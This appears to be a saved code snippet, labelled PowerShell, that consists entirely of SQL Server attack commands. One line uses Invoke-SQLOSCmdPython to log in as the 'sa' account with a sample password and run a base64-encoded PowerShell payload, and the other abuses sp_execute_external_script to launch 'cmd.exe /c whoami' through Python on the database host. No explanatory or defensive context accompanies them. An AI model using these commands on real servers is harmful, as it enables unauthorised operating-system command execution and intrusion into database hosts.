---
id: 2cf7d60b-b4ab-4cb6-bb2f-15cfbb26764c
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.606248+00:00'
updated_at: '2023-04-10T20:36:47.210363+00:00'
---

# Code Snippet 2cf7d60b

**Language**: ps1

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```
